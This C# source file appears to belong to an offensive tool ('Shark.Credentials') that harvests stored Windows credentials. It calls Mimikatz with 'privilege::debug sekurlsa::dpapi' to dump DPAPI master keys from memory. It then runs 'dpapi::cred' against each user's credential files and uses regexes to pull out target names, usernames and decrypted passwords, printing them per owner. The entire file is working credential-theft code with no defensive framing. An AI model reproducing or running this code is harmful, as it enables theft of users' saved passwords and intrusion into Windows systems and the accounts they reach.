using System.Collections.Generic;
using GetCredentials.lib;
using System.Collections;
using System.Text.RegularExpressions;



namespace Shark.Credentials
{
    class Windows
    {
        public static void GetLogins()
        {
            /*
             * by  credfile \mimikatz
             */
            Common.showMessage("[*]", "Try to get Windows Credentials");
            ArrayList userMasterKeyGuid = Dpapi.GetCredFileMasterKeyGuid();
            Hashtable MasterKeysDict = GetMasterKeys();

            foreach (Dictionary<string, string> data in userMasterKeyGuid)
            {
                data.TryGetValue("MasterKeyGuid", out string MasterKeyGuid);
                data.TryGetValue("CredentialFilePath", out string CredentialFilePath);
                data.TryGetValue("userName", out string userName);
                // Console.WriteLine(MasterKeyGuid);
                if (MasterKeysDict[MasterKeyGuid] != null)
                {
                    // Console.WriteLine("gui ： " + MasterKeyGuid +" masterkey : " +Masterkey );
                    ParseMasterKey(CredentialFilePath, MasterKeysDict[MasterKeyGuid].ToString(), userName);
                }

                /*   if (MasterKeysDict.TryGetValue(MasterKeyGuid, out string Masterkey))
                   {
                       // Console.WriteLine("gui ： " + MasterKeyGuid +" masterkey : " +Masterkey );
                       ParseMasterKey(CredentialFilePath, Masterkey, userName);
                   }*/
            }
            Common.showMessage("[*]", "Try to get Windows Credentials end");

        }
        private static void ParseMasterKey(string CredentialFilePath, string MasterKey, string userName)
        {
            string cmd = string.Format("\"dpapi::cred /in:{0} /masterkey:{1}\"", CredentialFilePath, MasterKey);
            //Console.Write(cmd);
            string MimikatzOut = Mimikatz.Command(cmd);
            //Console.WriteLine(MimikatzOut);
            string TargetName = GetOneByPattern(MimikatzOut, @"TargetName\s+:\s+(.*?)\s+");
            string UserName = GetOneByPattern(MimikatzOut, @"UserName\s+:\s+(.*?)\s");
            string CredentialBlob = GetOneByPattern(MimikatzOut, @"CredentialBlob\s+:\s+(.*)\s+A");
            string LastWritten = GetOneByPattern(MimikatzOut, @"LastWritten\s+:\s+([0-9]{4}/[0-9]{1,2}/[0-9]{1,2}\s+[0-9]{1,2}:[0-9]{1,2}:[0-9]{1,2})");
            Common.showMessage("[+]", string.Format("OWNER:{0} TARGET:{1} USERNAME:{2} PASSWORD:{3} TIME:{4}", userName, TargetName, UserName, CredentialBlob, LastWritten));
        }

        private static Hashtable GetMasterKeys()
        {
            var MasterKeys = new ArrayList();
            string MimikatzOut = Mimikatz.Command("privilege::debug sekurlsa::dpapi");
            //Console.Write(MimikatzOut);
            string GuidPattern = @"([0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12})";
            string MasterPattern = @"([0-9a-z]{128})";
            ArrayList GuidResult = GetListByPattern(MimikatzOut, GuidPattern);
            ArrayList MasterKeyResult = GetListByPattern(MimikatzOut, MasterPattern);
            // Dictionary<string, string> MasterKeysDict = new Dictionary<string, string>() { };
            Hashtable MasterKeysDict = new Hashtable();
            for (int i = 0; i < GuidResult.Count; i++)
            {
                if(MasterKeysDict[GuidResult[i].ToString()] == null)
                {
                    MasterKeysDict.Add(GuidResult[i].ToString(), MasterKeyResult[i].ToString());
                }
            }
            return MasterKeysDict;
        }

        private static ArrayList GetListByPattern(string input, string pattern)
        {
            Regex regex = new Regex(pattern);
            MatchCollection matchCollection = regex.Matches(input);
            ArrayList resList = new ArrayList();
            foreach (Match item in matchCollection)
            {

                /* Console.WriteLine(item.Groups[1].Value);
                 Console.WriteLine(item.Groups[2].Value);
                 Console.WriteLine(item.Groups[3].Value);*/
                resList.Add(item.Groups[1].Value);

                /* resList.Add(item.Groups[2].Value);
                 resList.Add(item.Groups[3].Value);*/
            }
            return resList;
        }
        private static string GetOneByPattern(string input, string pattern)
        {
            Regex regex = new Regex(pattern);
            MatchCollection matchCollection = regex.Matches(input);
            ArrayList resList = new ArrayList();
            foreach (Match item in matchCollection)
            {
                // Console.Write(item);
                //Console.Write(item.Groups[0].Value);
                //Console.Write(item.Groups[1].Value);
                return item.Groups[1].Value;
            }
            return "";
        }

        
    }
}
